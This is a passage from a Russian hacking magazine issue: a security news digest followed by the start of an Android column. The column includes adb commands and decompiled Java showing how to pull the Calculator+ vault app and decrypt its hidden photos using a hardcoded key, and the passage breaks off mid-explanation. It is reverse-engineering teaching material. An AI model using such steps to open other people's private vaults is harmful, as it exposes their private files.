
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                                  Ноябрь 2020
            № 260
CONTENTS

    MEGANews
  Всё новое за последний месяц

     Android
  StateFlow, SharedFlow и BroadcastChannel

    В поисках утечек
  Как хакеры ищут и уго няют чужие базы данных

    Попался!
  Что делать, если тебя привлека ют к уголовной ответственности за киберпрес тупле ние

     Yara
  Пишем правила, чтобы искать малварь и не только

    Вымогательство как услуга
  Кто и за сколько предлагает в даркнете помочь с вымога тельством

    Конвейер для пентеста
  Знакомимся с сервисом ScanFactory и автоматизируем обход периметра

    Гид по Lateral
  Изучаем удален ное исполнение кода в Windows со всех сто рон

    Биты защиты
  Разбираем спо собы защиты мик роконтроллеров

    За семью замками
  За щищаем приложение для Android от отладчиков, эмуляторов и Frida

    Бэкдор для LUKS
  Как перех ватить ключ и пароль от зашифрованного раздела в Linux

    Анализ данных в Linux
  Глава из книги «Bash и кибербезопасность»

    Гальваническая банка
  Делаем power bank для ноутбука в домашних условиях

    Получи и распишись
  За щищаем под писью зап росы приложе ния для Android

    Безопасность памяти
  Учим ся использовать указате ли и линей ные типы

    Такой разный VPN
  Разбираем альтернатив ные протоколы VPN

    Траблшутинг MikroTik
  Ре шаем распространен ные проблемы с легендарны ми роутерами

    NVME-кеширование в домашних NAS
  Тестируем Synology в комплекте с SSD-кешем

    Титры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





0‐DAY В CHROME
В этом месяце разработчики Google выкатили три обновления Chrome
для Windows, Mac и Linux, чтобы устранить более десятка уязвимос тей, вклю‐
чая нес коль ко 0‐day‐проблем, активно исполь зуемых хакерами.


CVE-2020-16009
Баг был обнаружен внутренней командой безопас ности Google, задача
которой — отслеживать злоумышленни ков и их текущие операции. Проблема
была связана с работой JavaScript‐движка V8 и допускала удаленное выпол‐
нение произвольного кода. Пока подробности об уязвимости и ее эксплуата‐
ции не разглашаются.
   Стоит заметить, что это обычная практика для Google: специалисты ком‐
пании  могут месяцами «молчать» о  технических  деталях  багов,  что бы
не давать злоумышленникам подсказок и поз волить пользователям спокойно
установить обновления.


CVE-2020-16010
Исправление  этой  уязвимости  появилось  в Chrome  для  Android  вер‐
сии  86.0.4240.185. Извес тно,  что проблема связана с переполнени ем
буфера кучи в одном из UI‐компонен тов, однако технические подробности
тоже пока не раскрываются. Специалисты компании отмечают, что уяз‐
вимость уже применялась зло умышленниками для побега из песоч ницы, то
есть позволяла выпол нить код вне изолированной среды.


CVE-2020-16013 и CVE-2020-16017
Если предыдущие проблемы были найдены самими инженерами Google, то
на этот раз уязвимости обнаружили благодаря сооб щениям, полученным
из анонимного источника. CVE‐2020‐16013 описыва ется как «некорректная
имплементация в V8», а CVE‐2020‐16017 — как «ошибка нарушения целос‐
тности информации в памяти типа use after free» в составе компонента Site
Isolation. Нес мотря на общий источник, в настоящее вре мя неясно, исполь‐
зовались эти уязвимости как часть единой цепочки экспло итов или же их при‐
меняли по отдельности.


ОБХОД ПЕСОЧНИЦ
Эксперты компании Positive Technologies проана лизировали 36 семей ств малвари, которые
были активны в пос ледние десять лет, и проследили за изме нени ями в методах обхода песоч‐
ниц и средств анализа и обна ружения.

25% всех вредоносных прог рамм, вошедших в исследование, были активны в 2019–
2020 годах, и не менее 23 APT‐группировок по все му миру использовали эту малварь для атак,
причем в 69% случаев с целью шпионажа.

В 2018–2019 годах уве личилось количество мал вари, которая применяет методы обхо да
песоч ниц. Впро чем, при чина, вероятнее всего, в том, что воз росло число исследований мал‐
вари в целом.





Чаще всего тех ники обхо да песоч ниц и обнаружения средств ана лиза внед ряют в мал варь
для уда лен ного доступа (56%) и заг рузчи ки (14%).

Среди наиболее часто встречающихся способов обхо да песоч ниц эксперты наз вали отправ ку
WMI‐запросов (25%) или иные проверки окружения (33%), а также проверку спис ка запущен‐
ных про цес сов (19%).





VPN ОТ GOOGLE
Разработчики Google сообщили, что клиенты Google One смогут исполь‐
зовать VPN‐сервис компании, что обес печит им дополнительный уровень
защиты в интернете. В первую очередь это нововведение ориентировано
на тех, кто часто подключается к незащищенным сетям Wi‐Fi в кафе и других
общественных местах, наивно раскрывая при этом данные банковских карт
и другую лич ную информацию.
  Сервис будет «бесплат ным», но доступным только для кли ентов, под‐
писанных на Google One и тарифный план 2 Тбайт или выше, стоимость
которого составляет 9,99 доллара в месяц (699 рублей в месяц для России).
Сначала VPN‐сервис будет доступен только в США для Android, но в ближай‐
шие месяцы Google планирует запустить новую услугу и в других странах,
а также для других операционных сис тем, включая Windows, macOS и iOS.



     «Мы встро или рас ширенную безопас ность во все наши про дук ты,
      и VPN допол нительно расширя ет эту безопасность, чтобы шифровать
      весь онлайн‑трафик вашего телефо на, незави симо от того, какое при-
      ложение или бра узер вы исполь зуете, — расска зывает Лариса Фон-
       тейн, гла ва Google One. — VPN встро ен в приложение Google One,
      поэто му всего одно нажатие, и вы можете быть уве рены, что ваше
      соединение защищено от хакеров».

Разработчики Google уже выпустили технический документ, содержащий
некоторые технические под робности о новом VPN‐сервисе, а также опуб‐
ликовали  исходный  код  клиентской  библиотеки,  чтобы  пользователи
и эксперты могли про верить, как она обрабатывает данные. В компании
заверяют, что VPN‐сервис не ведет логов активности поль зователей, а также
любых  данных,  которые  могут  использоваться  для  рас крытия  лич ной
информа ции. К таким данным относят ся: сетевой трафик, IP‐адреса, времен‐
ные метки подключений и информация о полосе про пускания.


20 000 000 ПОЛЬЗОВАТЕЛЕЙ BRAVE
Разработчики Brave похвастались, что с тех пор, как в прошлом году их браузер наконец достиг
первой ста биль ной версии 1.0, его аудитория замет но воз росла.

Так, еще осенью 2019 года Brave нас читывал лишь 8 700 000 активных пользователей еже‐
месяч но, а теперь таковых уже более 20 000 000.

Ежедневно браузером пользуются более 7 000 000 человек, и это превышает прошлогод ние
показатели (3 000 000 человек в день) более чем вдвое. Для срав нения: в настоящее вре мя
у Firefox свы ше 220 000 000 активных пользовате лей.

Также разработчики Brave отмечают, что с тех пор, как Apple разрешила использовать в iOS
любые браузе ры по умолчанию, пользовательская база Brave на iOS увеличилась на треть.





RASPBERRY
В КЛАВИАТУРЕ
Инженеры Raspberry Pi Foundation пред ставили не совсем обычный гаджет:
полноценный компьютер, раз мещен ный в корпусе небольшой (286 × 122 ×
23 мм) клавиатуры. Прекрасно понимая, какие ассоциации возникнут у поль‐
зователей, раз работчики даже приводят шуточное сравнение новинки с Com‐
modore 64. Устройство позици онируется создателя ми как полноценный дес‐
ктопный ПК, к которому нужно лишь подключить монитор и прочую перифе‐
рию.





Raspberry Pi 400 построена на базе процес сора ARM Cortex‐A72 (1,8 ГГц)
и комплектуется 4 Гбайт оперативной памяти. Клавиатура осна щена Gigabit
Ethernet, Bluetooth 5.0 (BLE) и Wi‐Fi 802.11b/g/n/ac, имеет два порта USB 3.0,
один порт USB 2.0, интерфейс ввода‐вывода GPIO и слот для карты МicroSD.
Есть в Raspberry Pi 400 и два порта HDMI, под держивающих переда чу изоб‐
ражения в разрешении 4K с частотой до 60 Гц. Питание на устрой ство пода‐
ется через порт USB‐C. По сути, это более быс трый и интересный вариант
Raspberry Pi 4.
  Девайс доступен в двух вариантах: одна клавиатура продается за 70 дол‐
ларов США, в ком плект за 100 дол ларов включены дополнительно мышь,
блок питания, HDMI‐кабель, карта MicroSD и руководство. Пока продажи
стартовали только для Великоб ритании, США и Франции, но ожи дается, что
в ближайшие недели устрой ство ста нет дос тупно в Ита лии, Германии и Испа‐
нии. Разработчики обещают, что до кон ца года Raspberry Pi 400 также появит‐
ся в Индии, Австралии и Новой Зеландии, а затем (в первые нес колько
месяцев 2021 года) — по всему миру.


ДУРОВ ПОПРОБОВАЛ IPHONE 12 PRO
Павел Дуров про дол жает выступать с критикой в адрес компании Apple. Но если рань ше кри‐
тика была в основном связана с тем, что Apple злоупотребляет сво им положением на рынке,
теперь в своем Telegram‐канале Дуров раскритиковал и новые iPhone.





→«Только что поп робовал iPhone 12 Pro, до чего громоздкая железка. Он выглядит и ощу‐
щается как более круп ная версия iPhone 5 2012 года выпуска, толь ко с урод ливыми камерами,
торчащими [из корпуса] на трех разных высотах. Прес ловутая „чел ка“ и широкие грани тоже
на месте, из‐за чего страдает соотношение площади экрана к корпусу и появляется ощущение
уста ревшего устройства.
   С момен та смер ти Сти ва Джобса прошло девять лет, а ком пания по‐преж нему живет
за счет технологий и репутации, которые он создал, без каких‐либо значимых инноваций.
Неуди витель но, что в начале текущего года продажи iPhone упали на 21%. Если эта тенденция
сохранится, через 7–10 лет доля iPhone на мировом рынке станет незначительной»
— Павел Дуров у себя в Telegram





МИЛЛИАРД
В БИТКОЙНАХ
В ночь президентских выборов в США криптовалютное сообщество обратило
внимание на огромный перевод: кто‐то опустошил биткойн‐кошелек, содер‐
жавший около мил лиарда долларов.
  Кошелек был связан с даркнет‐маркетплейсом Silk Road, который пред‐
лагал своим поль зователям самые разные незакон ные товары и услуги:
начиная от наркотиков и малвари и заканчивая заказными убийствами. Мар‐
кетплейс был зак рыт властями еще в 2013 году, а его глава Росс Ульбрихт —
приговорен к двойному пожизненному заключению, которое сейчас отбывает
в США.
  Оказалось, что миллиард дол ларов обнаружили... правоохранители. Про‐
курор США Дэвид Андерсон рассказал, что, несмотря на закрытие тор говой
площадки и осуждение Ульбрихта, у властей оставался вопрос, куда же
делись деньги. Операторы Silk Road направля ли бит койн‐транзакции через
специальный тумблер‐сервис, из‐за чего средс тва было крайне сложно
отследить.
  Прибегнув к помощи специалис тов из компании Chainalysis, правоох‐
ранитель ные  органы обна ружили,  что еще  в 2013  году были  совер‐
шены 54 транзакции на общую сум му 70 411,46 биткойна, которые были
отправлены на два адреса. Так как эти транзакции не фигурирова ли в собс‐
твенной базе данных Silk Road, предполага лось, что средства были кем‐то
украдены.





В  апреле  2013   года   основная   часть   этих   средств,   в   раз‐
мере 69 471,082 201 биткойна, была отправлена на упомянутый выше
кошелек, обозначенный в бумагах как 1HQ3 (по первым символам адреса).
В этом кошельке в итоге осе ло 69 370,224 915 43 биткойна, или около мил‐
лиарда долларов США. В 2015 году неназ ванный хакер пытался лик видиро‐
вать часть украденных средств через криптовалютную биржу BTC‐e, которая
в итоге была закрыта влас тями США за отмывание денег. В Налоговой служ‐
бе США и Министерстве юстиции считают, что он попросту украл крип‐
товалюту у Silk Road.
  В итоге в начале ноября 2020 года тот самый хакер, фигурирующий
в судебных документах как Individual X, был найден правоохранителями, под‐
писал соглашение с властями и передал им все содержимое кошелька 1HQ3.
Теперь Минюсту предсто ит доказать, что изъятая криптовалюта действитель‐
но была связана с Silk Road и подлежала конфискации.


МАЛВАРЬ ИЗ GOOGLE PLAY STORE
Эксперты ком пании NortonLifeLock (ранее Symantec) и IMDEA Software Institute опуб ликовали
резуль таты интересного иссле дования, круп нейшего в сво ем роде на текущий момент: изу‐
чили, по каким каналам вредонос ные приложения попадают на устройства пользователей.

Было изучено про исхождение приложе ний на 12 000 000 Android‐устрой ств за период с июня
по сен тябрь 2019 года. В общей слож ности анализу под верглись свыше 34 000 000 APK
для 7 900 000 уни каль ных приложений.

От 10 до 24% про анализированных при ложе ний могут рас цениваться как вре доносные
или нежелательные.

Порядка 67,5% вре доносных приложе ний были взя ты жертвами напрямую из Google Play
Store. Второе место с боль шим отста вани ем занимают аль тер нативные магази ны приложений,
на которые приходится лишь 10% уста нов ленной малвари.





ПРОБЛЕМЫ
LET’S ENCRYPT
Разработчики Let’s Encrypt предуп редили, что в 2021 году серьезные проб‐
лемы с сер тификатами и дос тупом к сайтам могут возникнуть у пользователей
устройств, работающих под управлением Android 7.1 (Nougat) и более старых
версий ОС. 1 сентября 2021 года истекает срок партнерства Let’s Encrypt
и организации IdenTrust. Это озна чает, что корневой сертификат Let’s Encrypt,
имеющий перекрестную под пись с IdenTrust DST Root X3, тоже истечет 1 сен‐
тября 2021 года.


                                     Продолжение статьи →
← Начало статьи





   Let’s Encrypt уже давно имеет собственный корневой сертификат ISRG Root
   X1, поэтому изменение не вызовет неполадок в боль шинстве современных
  ОС. Однако это не касается старых версий Android, не обновлявшихся
  с 2016 года, так как они не доверяют собственному корневому сертификату
   Let’s Encrypt. К сожалению, таких девайсов в экосис теме Android насчитыва‐
   ется около 34%, а генерируют они, по подсчетам инженеров Let’s Encrypt,
  до 5% всего тра фика.



         «Что мы можем сделать с этим? Что ж, мы хотели бы иметь воз-
        можность улучшить ситу ацию с обновле ниями Android, но здесь мы
         ничего не можем поделать. Так же мы не можем поз волить себе
         купить новые телефо ны всем  в  мире, — пишет Джейкоб Хоф-
        фман‑Эндрюс, ведущий раз работчик Let’s Encrypt. — Можем ли мы
         получить еще одну перек рестную подпись? Мы изучали этот вари ант,
        и он кажется малове роятным. Это боль шой риск для центра сер-
        тификации — перек рестная подпись сер тифика та другого цен тра, ведь
         таким обра зом они берут на себя ответственность за все, что дела ет
         другой центр сер тифика ции».

  Разработчики  Let’s  Encrypt  совету ют  пользователям  старых  устройств
   готовиться осенью к воз можным проблемам и хотя бы уста новить мобильную
  версию Firefox (этот браузер имеет собственный список доверенных кор‐
  невых сер тификатов). Также в теории мож но установить необходимые сер‐
  тификаты вруч ную.


 В MICROSOFT БУДЕТ РАБОТАТЬ «ОТЕЦ» ЯЗЫКА PYTHON
  В прошлом  году  «отец» языка Python Гвидо ван Россум, которому  тог да исполнилось
   уже 63 года, отошел от дел и объявил, что ухо дит на пен сию. Однако теперь ван Россум неожи‐
   данно сооб щил, что скоро вернется к работе, причем не где‐нибудь, а в ком пании Microsoft.





  →«Я при шел к выводу, что на пенсии очень скуч но, и при соеди нился к отде лу раз работчиков
    Microsoft. Для чего? Слишком много вариантов, что бы перечис лить! Но это наверняка улучшит
   исполь зование Python (и не только в Windows :‐). Здесь много опен сорса. Сле дите за этой
   областью»
  — ван Россум у себя в Twitter





 ИТОГИ PWN2OWN
 И TIANFU CUP
  Состязание Pwn2Own Tokyo в этом году проводилось в онлайн‐формате,
  а участни ки демонстрировали свои экспло иты уда ленно. Тем не менее учас‐
   тники  заработали  136  000  дол ларов,  обнаружив  и  продемонстри‐
  ровав 23 уникальные уязвимости на шести устройствах. Теперь произво дите‐
  лям отводится 120 дней на выпуск исправлений, прежде чем ZDI обнародует
  подробности багов.
    Победителем соревнования стала команда Team Flashback, в которую вхо‐
   дят нас тоящие ветера ны Pwn2Own — Педро Рибейро (Pedro Ribeiro) и Радек
  Домански (Radek Domanski). В первый день сорев нований Team Flashback
  успешно взло мала WAN‐интерфейс маршрутизатора NETGEAR Nighthawk
  R7800 и смогла оставить на устройстве устойчивый бэкдор, который сох‐
  ранялся даже после сброса к заводским настройкам. Этот взлом принес
  команде 20 000 долларов и два очка Master of Pwn.
    Во второй день Team Flashback скомпрометировала маршрутизатор TP‐
   Link AC1750 Smart WiFi, использовав для этого три RCE‐уяз вимости, и получи‐
  ла еще 20 000 долларов и два очка.
     Команда DEVCORE, заняв шая вто рое место, зарабо тала 20 000 долларов
  за успешную демонс трацию эксплоита против NAS Synology  DiskStation
   DS418Play и еще 17 500 дол ларов — за экспло ит для NAS Western Digital My
  Cloud Pro Series PR4100. Для взлома Western Digital команда исполь зовала
  цепочку аж из шести уязвимостей.
    В Китае тем вре менем прошло собственное хакерское соревнование —
   Tianfu Cup, очень похожее на Pwn2Own и созданное именно после того,
   как в 2018 году китайское правительство зап ретило местным ИБ‐исследова‐
  телям участвовать в хакер ских конкурсах, организованных за рубежом. Как и
  во время Pwn2Own, обо всех использованных экс плоитах и найденных багах
  сообщают разработчикам скомпрометированных продук тов, и патчи выходят
  вскоре после завер шения соревнования.
    По итогам сорев нования участники продемонс трировали 23 попытки взло‐
   ма, во время которых удалось скомпрометировать:
   • iOS 14 (работающую на iPhone 11 Pro);
   • Samsung Galaxy S20;
   • Windows 10 2004 (April 2020);
   • Ubuntu;
   • Chrome;
   • Safari;
   • Firefox;
   • Adobe PDF Reader;
   • Docker (Community Edition);
   • VMware ESXi (гипервизор);
   • QEMU (эму лятор и виртуализатор);
   • прошивки роутеров TP‐Link и ASUS.

  Как и в прошлом году, с большим отры вом победила команда специалистов
   китайского технологического гиган та Qihoo 360 (она же Team 360Vulcan).
  Победители забрали домой 744 500 долларов — почти две трети призового
  фонда. Второе и третье места заняли команда Ant‐Financial Light‐Year Security
  Lab (258 000 долларов) и частный ИБ‐иссле дователь Панг (99 500 долларов).


  УТЕЧКА CAPCOM
  В начале нояб ря японская корпорация Capcom пос тра дала от хакерской атаки, и взлом повлиял
   на биз нес‐операции разработчика игр, вклю чая работу системы электронной почты.

   По данным СМИ, Capcom стала жертвой шифровальщика Ragnar Locker. В запис ке с тре‐
   бованием выкупа хакеры сооб щали, что перед началом шиф рования они похитили около
    1 Тбайт файлов из корпоративных сетей Capcom в Япо нии, США и Канаде.

   Через нес коль ко недель Capcom приз нала, что хакеры похити ли не толь ко конфиден циаль ные
   корпоративные документы, но и информацию о клиентах и сотрудниках ком пании. В общей
   слож ности постра дали около 350 000 человек.





 ИСХОДНИКИ
 COBALT STRIKE
  На GitHub появился репозиторий, который содержит исходные коды Cobalt
   Strike. Судя по файлу src/main/resources/about.html, это исходни ки Cobalt
   Strike вер сии 4.0, выпущенной 5 декабря 2019 года. У репозитория уже
  появилось более 1200 форков, что существенно зат рудня ет сдерживание
  дальнейшего распространения исходников.
      Cobalt  Strike —  легитимный  коммерческий  инструмент,  созданный
  для пентестеров и red team и ориентированный на эксплуатацию и постэкс‐
   плуатацию. Его дав но полюбили все хакеры, начиная от правительственных
  APT‐группировок и заканчивая операторами шиф ровальщиков. Пол ная вер‐
  сия Cobalt Strike оценивается примерно в 3500 дол ларов за уста новку, но,
   как правило, зло умыш ленники исполь зуют Cobalt Strike бесплатно (старые,
  пиратские, взломанные и незарегис трированные версии), применяя его
  во время вымогатель ских атак для получения устойчивого уда ленного доступа
   к скомпрометированной сети.
     ИБ‐эксперт Виталий Кремез (Vitali Kremez) из компании Advanced Intel,
   изучавший исходники по просьбе журналистов, сообщает, что, по его мне‐
  нию, дан ный Java‐код был декомпилиро ван вручную. Неизвестный изба вился
   от всех зависимостей и проверки лицензии, чтобы инс трумент можно было
  скомпилировать вновь. Кремез пре дупреждает, что эта утечка может иметь
  серьезные последствия, так как она «устраняет входной барьер на пути
   к получе нию инструмента и существен но облегчает задачу получения и изме‐
  нения кода для преступных группировок».


  РАБОТА ПОСЛЕ ПАНДЕМИИ
   «Лабора тория Касперско го» выяснила, что 68% россиян, занятых в малом и сред нем бизнесе,
   не готовы вернуть ся к привычной организации рабочего процес са пос ле окончания пандемии
   коронавиру са.


   На удаленке у людей появились воз можности, которые они хотели бы сохранить в дальнейшем:
   больше вре мени проводить с семьей (54%), не тра тить время на дорогу до работы и обратно
     (53%) и эко номить деньги (45%).

   Около трети опрошен ных не хотели бы возвращаться к тем или иным при нятым ранее пра‐
   вилам. Например, 32% не готовы сно ва работать по строгому восьмичасовому графику.
  В целом по миру этот показатель даже выше — 39%. Еще 35% не хотят быть стро го привязаны
   к офису, 33% — к пятидневной рабочей неделе.

   Каждый чет вертый (24%) хотел бы продолжать работать уда ленно и после окончания пан‐
   демии.





 MICROSOFT
 ПРОТИВ SMS
  Эксперты ком пании Microsoft в очередной раз подняли вопрос о небезопас‐
  ности многофакторной аутен тификации через телефон с помощью одноразо‐
  вых кодов в SMS‐сообщениях (или голосовых вызовов). Компания призывает
  использовать более новые тех нологии: при ложе ния‐аутентифика торы и клю‐
  чи безопас ности.
    Предупреждение  исходит  от  Алекса Вей нерта  (Alex  Weinert),  главы
  по безопасности идентификационной информации Microsoft. Вейнерт объ‐
  ясняет, что, если есть выбор меж ду несколькими способа ми МФА, ни в коем
   случае нель зя делать его в пользу телефо на: аутентификация через телефон
  зависит от множества узких мест, хотя бы от состояния телефонных сетей.
  SMS‐сооб щения и голосовые вызовы передаются в открытом виде и могут
  быть легко перехвачены злоумышленниками с помощью таких методов и инс‐
   трументов, как SDR (Software‐Deﬁned Radio), FEMTO или багов SS7.
     Кроме того, одно разо вые коды из SMS‐сообщений могут быть извлечены
  с помощью опен сор сных и доступных фишинговых инструментов, таких
   как Modlishka, CredSniper или Evilginx. Или же сотрудников мобильных опе‐
  раторов могут обмануть мошенники, чтобы под менить SIM‐карту жертвы
   (такие ата ки обыч но называют SIM swap), что поз волит злоумышленникам
   получать одно разовые коды МФА от лица цели. По словам Вейнерта, все
   это делает МФА на основе SMS‐сообщений и голосовых вызовов «наименее
  безопасным из всех доступных на сегодня методов МФА».
     А самое надежное из защитных решений — использовать аппаратные
  ключи, которые Вей нерт еще в прошлом году называл «лучшим решением
   в области МФА».
    Напомним,  что  точ ка зрения Вей нерта не  нова: еще в 2016  году
  Национальный инсти тут стандартов и технологий США (NIST) предста вил
   документ, согласно которому использование SMS‐сообщений для двух‐
  факторной  аутен тифика ции  будет рассмат риваться  как  «недопустимое»
  и «небезо пасное».


 РАСПРОДАЖИ И ФИШИНГ
   Аналитики Check Point Research отмечают всплеск активности хакеров в течение пос ледних 6
   недель. Из‐за огра ничений, связанных с COVID‐19, онлайн‐шопинг в этом году вышел на новый
   уровень, а количество онлайн‐покупок в «черную пятницу», «кибер понедельник» бьет все
   рекорды. Но к буму интернет‐покупок готовятся не только магазины и покупатели, злоумыш‐
   ленни ки тоже мобили зуют ся, чтобы заработать на скидочном ажиотаже.

  В пери од с 8 октября по 9 нояб ря во всем мире удвоилось количество фишинговых рас‐
   сылок со «специаль ными предложениями»: со 121 случая в неделю в октябре до 243 случаев
   в неделю к началу нояб ря.

   Также на 80% увеличилось число фишин говых рассылок, связанных с распро дажами и спе‐
   циаль ными предложениями от магазинов. Подобные элек тронные письма содержали сло ва
    «sale», «% off» и другие, связанные с выгод ными покупками.

   Всего за 2 дня (9 и 10 нояб ря) количество фишинговых атак со «спе циальными предложени‐
   ями» было выше, чем за пер вые 7 дней октября.





 ПОБЕДА YOUTUBE‐DL
  На GitHub восстановили репозиторий опенсорсного проекта youtube‐dl.
     Эта история началась в прошлом месяце, когда правообладатели из Аме‐
  риканской ассоциации зву козаписывающих компаний (RIAA) добились уда‐
  ления youtube‐dl и 17 его копий. Библиотека была удалена якобы из‐за
  наруше ния DMCA (Digital Millennium Copyright Act — Закон об автор ском пра‐
  ве в цифровую эпоху): по словам пра вооб ладателей, проект мог применяться
  для «обхода техничес ких мер защиты, используемых авторизованными стри‐
  минговыми сервисами, такими как YouTube».
     Этот слу чай породил шквал критики в адрес RIAA, GitHub и компании Mi‐
   crosoft, которой с 2018 года при надлежит сервис. Даже Нэт Фридман (Nat
   Friedman), воз главив ший GitHub пос ле приобретения сервиса  Microsoft
   в 2018 году, был недоволен сложившимся положением и скооперировался
  с юристами Фон да электронных рубежей (Electronic Frontier Foundation, EFF),
  которые взя лись за анализ ситуации.
    В итоге команда EFF выяснила, что Google не исполь зует какие‐либо тех‐
  нические средства для пре дотвращения загрузки своих видео, которые дол‐
  жны быть бесплатно дос тупны для всех видов приложе ний, бра узеров, умных
  телевизоров и так далее. Следова тель но, библиотека youtube‐dl не может
  быть заблокирована в соответствии с разделом 1201, так как вообще
  не обходит какую‐либо систему защиты автор ских прав.
     Если говорить короче, youtube‐dl ничего не нарушает, так как YouTube
  ничего и не запрещал.
     Скандал, связанный с удалением youtube‐dl, стал для GitHub хорошей воз‐
  можностью поучиться: после случившегося в ком пании планируют учредить
  Фонд защиты разработчиков в размере 1 000 000 долларов, который будет
  использоваться для защиты разработчиков от «необоснованных требований
  об удалении на основании раздела 1201 DMCA». Кроме того, GitHub обещает
  за свой счет нанять техничес ких и юридических экспертов, а также незави‐
  симых спе циалистов, которые будут рас сматривать все претензии на уда‐
  ление кон тента.


  123456
   Близится конец года, и разработчики менед жера паролей NordPass в очередной раз опуб‐
   ликова ли список наибо лее используемых и  слабых паролей 2020  года.  Увы,  за  пос‐
   ледние 12 месяцев безопас ность паролей нис коль ко не улучшилась.

   Для составле ния ежегодного отче та эксперты изучили 275 699 516 паролей, просочившихся
   в сеть в ходе различных уте чек данных.


   Наиболее распространенные пароли по‐прежнему невероятно лег ко угадать: на взлом учетных
   записей с такими паролями у зло умышленников может уйти меньше секунды или двух.

   Только 44% изучен ных паролей были признаны уникальными.

  В 2020 году наибо лее популярными вариантами паролей были приз наны: 123456, 123456789,
   picture1, password и 12345678.

   Также люди по‐преж нему часто используют дру гие слабые пароли, которые край не легко уга‐
   дать: среди них мож но перечислить football, iloveyou, letmein и pokemon.
  В ито ге топ‐10 худших паролей 2020 года выг лядит следующим образом.





 ШПИОНСКИЙ
 ПЫЛЕСОС
  Группа ученых из университета Мэриленда и Национального университета
  Сингапура продемонс трирова ла ата ку LidarPhone, которая спо собна прев‐
   ратить умный пылесос в шпи онское устройство, записывающее разговоры
  поблизости. Как можно понять из названия, атака полага ется на исполь‐
  зование  встроенного  в  устройство  лидара,  который  нужен  пылесосу
  для навигации в пространстве.





  Потенциальный злоумышленник может использовать лидар и его лазер
   в качестве лазер ного мик рофона, которые неред ко при меняются спецслуж‐
  бами. Такой микрофон направляют на окон ное стекло и с его помощью
  отслеживают вибрации стекла, затем можно их декоди ровать и рас шифро‐
   вать раз говоры, происходив шие внутри помещения.
     Атака LidarPhone требует соб людения ряда определенных условий. К при‐
   меру, лидар устройства акти вен и вращается постоянно, что сокращает
  количество данных, которые может соб рать ата кующий. Злоумыш ленник
  будет вынужден найти некую уязвимость, что бы пробраться в про шивку
  и остановить вращение лидара, заставив его сфокусировать ся на одном объ‐
   екте. Также нужно отметить, что лидары роботов‐пылесосов далеко не так
   точны, как лазерные микрофоны.
     Невзирая на огра ничения, исследователям уда лось получить хорошие
  результаты во вре мя тестов на роботе‐пылесосе Xiaomi Roborock. Экспе‐
  рименты иссле дова телей концентрировались на восстановлении «числовых
  значений», которые в итоге удалось распознать с точностью 90%. Однако
   авторы атаки отмечают, что LidarPhone можно исполь зовать для идентифика‐
  ции говоря щих по половому признаку и даже для определения политических
   взглядов целей по выпускам новостей, звучащим на фоне.
HEADER
ANDROID





                  STATEFLOW, SHAREDFLOW
              И BROADCASTCHANNEL





Сегодня в выпуске: обна ружение динами‐
чески  загружаемого при ложе нием  кода,
реверс приложе ния для шифрования фай‐
лов, рас сказ об истории соз дания State‐
Flow,   SharedFlow  и   BroadcastChannel          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
в Kotlin, статья с подборкой инструментов              zobnin@glc.ru
для сер верной разработки на Kotlin, объ‐
яснение  сути контрактов  Kotlin, заметка
о фун кции Surround With в IDEA и Android
Studio. А также подборка свежих библиотек
для раз работ чиков.


                ПОЧИТАТЬ


Обнаружение динамически загружаемого кода
Detecting Dynamic Loading in Android Applications With /proc/maps — статья
о том, как определить, загружает ли приложение дополнительный исполня‐
емый код уже после своего старта. Так часто делают зловреды, чтобы избе‐
жать обна ружения зловредного кода.
  Метод крайне прос той. Достаточно иметь рутован ный смартфон с уста‐
новленным приложением и кабель для подключения к ПК. Далее выполняем
команду adb shell, чтобы открыть консоль устройства, получаем права root
с помощью команды su, узнаем имя PID (идентификатор процесса) нужного
нам при ложения:


$ ps ‐A | grep имя.пакета.приложения

PID будет во второй колонке. Теперь выполняем сле дующую команду, под‐
ставляя полученный PID:


cat /proc/PID/maps | grep '/data/data'

Файл /proc/PID/maps синтетический. Он содержит таблицу всех отображен‐
ных в памяти процесса файлов. Пер вая часть приведенной команды читает
этот файл. Вто рая часть команды (grep /data/data) оставляет в выводе
только файлы из при ватного каталога приложения (/data/data/имя.пакета.
приложения). Имен но отту да злов реды обычно загружают допол нительный
код.


Дешифровка зашифрованных приложением файлов
Decrypting images hidden with Calculator+ — разбор спо соба реверса и пос‐
ледующей расшифров ки файлов приложения Calculator+ — Photo Vault &
Video Vault hide photos. Пример крайне простой и поэтому хорошо подходит
для демонс тра ции основ реверса приложений для Android.
   Итак, есть при ложе ние Calculator+, которое имеет неожиданную функцию
секретного хранилища зашифрованных фотографий и видеороликов. Задача:
вытащить эти фотог рафии, не используя само приложение.
 1. Извлекаем приложе ние из смартфо на:


   $ adb shell pm list packages|grep calc
   $ adb shell pm path eztools.calculator.photo.vault
   $ adb pull /data/app/eztools.calculator.photo.vault‐OP_MBoGMZN‐
   LZ5wr50dNWA==/base.apk

 2. Ис поль зуем JADX‐GUI для декомпиляции приложения обратно в исходный
   код Java.
 3. С помощью встроенной функции поиска ищем все строки, имеющие отно‐
  шение к шиф рованию: encrypt, decrypt, AES и так далее. Автору уда лось
   найти следующий фрагмент кода:


   FileInputStream fileInputStream = new FileInputStream(this.f6363e.
   f6361a);
   ByteArrayOutputStream byteArrayOutputStream = new
   ByteArrayOutputStream();
   EncryptUtils.m10791a("12345678", fileInputStream,
   byteArrayOutputStream);
   byteArrayOutputStream.flush();
   ByteArrayInputStream byteArrayInputStream = new
   ByteArrayInputStream(byteArrayOutputStream.toByteArray());
   this.f6362d = byteArrayInputStream;
   aVar.mo2601d(byteArrayInputStream);

  Метод  EncryptUtils.m10791a()  оказался  искомым  методом шиф‐
   рования.





   Как видно из кода, метод шифрует файл алгорит мом DES и ключом,
